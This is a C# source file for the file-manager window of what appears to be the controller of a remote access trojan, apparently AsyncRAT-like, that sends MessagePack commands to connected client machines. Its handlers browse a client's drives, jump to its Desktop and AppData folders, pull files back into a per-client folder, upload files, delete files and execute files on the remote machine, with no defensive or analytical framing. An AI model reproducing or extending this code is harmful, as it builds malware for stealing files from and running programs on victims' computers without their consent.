using Server.MessagePack;
using Server.Sockets;
using System;
using System.Windows.Forms;
using System.Threading;
using System.IO;

namespace Server.Forms
{
    public partial class FormFileManager : Form
    {
        public FormFileManager()
        {
            InitializeComponent();
        }

        public Form1 F { get; set; }
        internal Clients C { get; set; }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count == 1)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "getPath";
                    msgpack.ForcePathObject("Path").AsString = listView1.SelectedItems[0].ToolTipText;
                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                    //toolStripStatusLabel1.Text = listView1.SelectedItems[0].ToolTipText;
                }
            }
            catch
            {

            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                string path = toolStripStatusLabel1.Text;
                if (path.Length <= 3)
                {
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "getDrivers";
                    toolStripStatusLabel1.Text = "";
                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                    return;
                }
                path = path.Remove(path.LastIndexOfAny(new char[] { '\\' }, path.LastIndexOf('\\')));
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getPath";
                msgpack.ForcePathObject("Path").AsString = path + "\\";
                //toolStripStatusLabel1.Text = path;
                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
            }
            catch
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getDrivers";
                toolStripStatusLabel1.Text = "";
                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                return;
            }

        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + C.ID)))
                        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + C.ID));
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        MsgPack msgpack = new MsgPack();
                        string dwid = Guid.NewGuid().ToString();
                        msgpack.ForcePathObject("Packet").AsString = "socketDownload";
                        msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
                        msgpack.ForcePathObject("DWID").AsString = dwid;
                        ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                        this.BeginInvoke((MethodInvoker)(() =>
                        {
                            FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                            if (SD == null)
                            {
                                SD = new FormDownloadFile
                                {
                                    Name = "socketDownload:" + dwid,
                                    Text = "socketDownload:" + C.ID,
                                    F = F
                                };
                                SD.Show();
                            }
                        }));
                    }
                }
            }
            catch
            {

            }
        }

        private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog O = new OpenFileDialog();
                O.Multiselect = true;
                if (O.ShowDialog() == DialogResult.OK)
                {
                    foreach (string ofile in O.FileNames)
                    {
                        FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + ""];
                        if (SD == null)
                        {
                            SD = new FormDownloadFile
                            {
                                Name = "socketUpload:" + Guid.NewGuid().ToString(),
                                Text = "socketUpload:" + C.ID,
                                F = Program.form1,
                                C = C
                            };
                            SD.dSize = new FileInfo(ofile).Length;
                            SD.labelfile.Text = Path.GetFileName(ofile);
                            SD.fullFileName = ofile;
                            SD.label1.Text = "Upload:";
                            SD.clientFullFileName = toolStripStatusLabel1.Text + "\\" + Path.GetFileName(ofile);
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "fileManager";
                            msgpack.ForcePathObject("Command").AsString = "reqUploadFile";
                            msgpack.ForcePathObject("ID").AsString = SD.Name;
                            SD.Show();
                            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
            catch { }
        }

        private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        MsgPack msgpack = new MsgPack();
                        string dwid = Guid.NewGuid().ToString();
                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
                        msgpack.ForcePathObject("Command").AsString = "deleteFile";
                        msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
                        ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch { }
        }

        private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (toolStripStatusLabel1.Text != "")
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "getPath";
                    msgpack.ForcePathObject("Path").AsString = toolStripStatusLabel1.Text;
                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                }
                else
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "getDrivers";
                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                    return;
                }
            }
            catch { }
        }

        private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        MsgPack msgpack = new MsgPack();
                        string dwid = Guid.NewGuid().ToString();
                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
                        msgpack.ForcePathObject("Command").AsString = "execute";
                        msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
                        ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch
            {

            }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            if (!C.ClientSocket.Connected) this.Close();
        }

        private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getPath";
                msgpack.ForcePathObject("Path").AsString = "DESKTOP";
                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                //toolStripStatusLabel1.Text = "DESKTOP";
            }
            catch
            {

            }
        }

        private void APPDATAToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getPath";
                msgpack.ForcePathObject("Path").AsString = "APPDATA";
                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                //toolStripStatusLabel1.Text = "APPDATA";
            }
            catch
            {

            }
        }
    }
}